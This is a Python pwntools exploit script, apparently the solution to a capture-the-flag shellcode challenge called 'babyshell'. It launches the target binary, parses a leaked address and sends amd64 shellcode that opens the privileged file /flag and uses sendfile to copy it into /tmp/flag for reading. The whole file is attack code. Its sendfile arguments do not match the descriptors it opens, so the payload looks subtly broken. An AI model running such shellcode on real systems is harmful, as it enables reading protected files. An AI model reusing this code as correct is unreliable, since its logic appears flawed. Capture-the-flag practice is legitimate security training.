from pwn import *
import sys, os
import time


class io:
    @classmethod
    def connect(cls):
        binary = sys.argv[0].split('.py')[0]
        if '/' in binary:
            binary = binary.split('/')[-1]
        binary = '/pwn/babyshell/' + binary
        cls.io = process(binary)
    @classmethod
    def readuntil(cls, x, timeout = None):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out) if time_out else cls.io.readuntil(x)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()


def bxock_stdout():
    sys.stdout = open(os.devnull, 'w')

def restore_stdout():
    sys.stdout = sys.__stdout__


def main():
    sc = shellcraft.amd64
    context.arch = 'amd64'
    context.os = 'linux'

    io.connect()
    io.readuntil('bytes from stdin into ')
    addr = int(io.readuntil('\n').split('.')[0][2:], 16)

    name = '/tmp/flag'
    pl = asm(sc.linux.open(name, 0x41, 0666))
    pl += asm('mov rcx, rax')
    pl += asm(sc.linux.open('/flag', 0))
    pl += asm(sc.sendfile(0, 1, 0, 50))

    io.sendline(pl)
    time.sleep(.1)
    io.close()
    with open(name) as f:
        print f.read()

if __name__ == '__main__':
    main()
